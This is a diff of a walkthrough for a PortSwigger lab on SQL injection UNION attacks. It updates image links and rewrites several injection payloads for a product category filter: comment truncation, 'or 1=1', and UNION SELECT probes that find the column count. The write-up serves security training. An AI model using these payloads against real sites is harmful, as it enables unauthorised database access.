@@ -14,42 +14,41 @@ Reference: https://portswigger.net/web-security/sql-injection/union-attacks
 We see there are 2 values displayed in the table, the name and the price of the products:
 
 
+<img width="1013" height="831" alt="1" src="https://github.com/user-attachments/assets/94cd6276-d12c-4ffb-a553-99176562c594" />
 
-![img](images/SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/1.png)
 
 The following payload is accepted and we see the 4 items from Accessories category:
 
 ```
-/filter?category=Accessories'--
+/filter?category=Tech+gifts'--
 ```
 
 
+<img width="1510" height="839" alt="2" src="https://github.com/user-attachments/assets/5639b56b-d5aa-43b5-8d76-1330b29c6a0c" />
 
-![img](images/SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/2.png)
+
 
 The same happens with this payload, to display all values:
 
 ```
-/filter?category=Accessories'+or+1=1--
+/filter?category=Tech+gifts'+or+1=1--
 ```
 
 We will update the payload to execute a UNION attack and find the query takes 3 parameters and not 2:
 
 ```
-/filter?category=Accessories'+union+select+NULL,NULL,NULL--
+/filter?category=Tech+gifts'+union+select+NULL,NULL,NULL--
 ```
 
 
-
-![img](images/SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/3.png)
+<img width="1521" height="816" alt="3" src="https://github.com/user-attachments/assets/ffabd0af-48ce-4300-b5e7-496590bfbca5" />
 
 
 We can also add values instead of using NULL:
 
 ```
-/filter?category=Accessories'+union+all+select+'0','1','2'--
+/filter?category=Tech+gifts'+union+all+select+Null,'b',Null--
 ```
 
 
-
-![img](images/SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/4.png)
+<img width="1520" height="793" alt="4" src="https://github.com/user-attachments/assets/847fdb84-54f2-4327-a52e-658093c39eff" />
